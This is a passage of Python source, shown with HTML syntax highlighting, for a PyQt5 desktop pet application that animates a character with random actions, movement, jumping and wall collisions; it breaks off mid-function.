<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Attached.CallWeatherWin <span class="keyword">import</span> Mainweather</span><br><span class="line"><span class="keyword">from</span> Attached.crawler <span class="keyword">import</span> Crawler</span><br><span class="line"><span class="keyword">from</span> Attached.Blankbox <span class="keyword">import</span> MainBOX</span><br><span class="line"><span class="keyword">from</span> Attached.Netease <span class="keyword">import</span> Netease</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>], <span class="comment"># 拖动_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>], <span class="comment"># 触地_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 跳跃_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 撞墙_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i+<span class="number">1</span>: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quitPet)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.heading = <span class="number">0</span></span><br><span class="line">        self.touchdown_key = <span class="number">0</span></span><br><span class="line">        self.jumpping_key = <span class="number">0</span></span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self,Act,start</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(Act)</span><br><span class="line">        self.timer.start(start)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.action == <span class="number">8</span>:</span><br><span class="line">                self.jumpping_key = <span class="number">1</span></span><br><span class="line">                self.InitTimer(self.randomAct,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.touchdown_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">6</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.touchdown()</span><br><span class="line">        <span class="keyword">elif</span> self.jumpping_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">8</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.jumpping()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                self.moving()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            <span class="keyword">if</span> self.action != <span class="number">3</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x 